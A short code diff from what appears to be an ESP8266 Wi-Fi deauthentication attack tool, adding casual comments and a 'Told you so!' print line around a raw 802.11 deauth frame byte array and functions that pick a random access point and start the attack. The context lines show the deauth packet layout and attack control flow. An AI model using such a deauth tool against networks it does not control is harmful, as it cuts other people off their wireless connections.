@@ -9,6 +9,7 @@
 
 // deauth packet defined here
 // this is sent using the ESP8266WiFi library
+// this is a raw frame/packet depending on where/how you refer to it in networking terms, i should specify or whatever...
 uint8_t deauthPacket[26] = {
     /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
     /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
@@ -39,6 +40,7 @@ void DeauthAttack::selectAP() {
         Serial.print("Selected random AP: ");
         Serial.println(randomAP);
     } else {
+        // well ur fucked. 
         Serial.println("No access points found.");
     }
 };
@@ -53,7 +55,9 @@ void DeauthAttack::startDeauth() {
             Serial.println("Attack is already running.");
         }
     } else {
+        // ok why did you modify the deauth function? i literally told you to not do that...
         Serial.println("No access point selected. Use selectRandomAP() first.");
+        Serial.println("('-') Told you so!");
     }
 };
 
